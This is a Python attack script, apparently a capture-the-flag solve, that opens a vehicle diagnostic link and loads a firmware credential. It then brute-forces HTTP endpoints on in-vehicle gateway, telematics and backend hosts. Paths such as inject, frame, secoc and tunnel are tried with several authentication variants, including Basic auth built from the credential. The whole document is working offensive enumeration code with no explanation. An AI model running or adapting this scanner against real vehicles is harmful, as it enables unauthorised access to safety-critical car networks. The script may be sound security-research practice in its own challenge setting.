import sys, json, hashlib, struct, requests, time, concurrent.futures
sys.path.insert(0,"04_SOLVE/uds")
from u import open_link, fresh_ticket
VIN="CV622697F82A936A1"
link,t2=open_link(VIN, verbose=True)
t=t2

# 带票据/Basic 扫 CGW 8080
import zipfile
man=json.load(open("work/t5/x/manifest.json"))
cred=json.load(open("work/diag3.json"))["data"]["vehicleDiagnostics"]["firmwareCredential"]

BASES={"cgw":"http://10.226.193.2:8080","cgw2":"http://10.225.139.4:8080",
       "tbox":"http://10.225.139.3:8080","tsp":"http://10.225.139.2:8080"}
nouns="""bridge canfd can canbus fd bus link tunnel open enable start up
relay forward proxy gateway route routing dispatch inject send frame
freshness secoc cmac ack bcm bms vcu ecu target session
objectives objective diag diagnostics ota campaign campaigns vehicle vehicles
state status control command cmd routine routines
internal admin debug test probe""".split()
verbs=["","/open","/enable","/start","/up","/on","/connect","/begin","/activate",
"/status","/state","/info","/list","/read","/send","/inject","/frame","/frames",
"/freshness","/session","/bridge","/tunnel","/relay","/final","/config"]
paths=set()
for n in nouns:
    for v in verbs:
        paths.add(f"/api/v1/{n}{v}")
        paths.add(f"/{n}{v}")
AUTH={"ticket":t}
hdrs_list=[("none",{}),
           ("ticket",{"Authorization":"Bearer "+t}),
           ("ticket-hdr",{"X-Diagnostic-Ticket":t}),
           ("basic",{"Authorization":"Basic "+__import__("base64").b64encode(f"diag:{cred}".encode()).decode()})]
def probe(args):
    bn,base,p,hn,hh=args
    out=[]
    for m in ("GET","POST"):
        try:
            r=requests.request(m,base+p,timeout=3,allow_redirects=False,
                               headers=hh, json={} if m=="POST" else None)
            if r.status_code!=404:
                out.append(f"{bn:5s} {hn:10s} {m:4s} {r.status_code} {len(r.content):5d} {p}  {r.text[:100]!r}")
        except Exception: pass
    return out
jobs=[(bn,b,p,hn,hh) for bn,b in BASES.items() for p in sorted(paths) for hn,hh in hdrs_list]
print(f"probing {len(jobs)} (path x auth x host) combos")
with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
    for res in ex.map(probe,jobs):
        for l in res: print(l,flush=True)
link.close()
print("done")
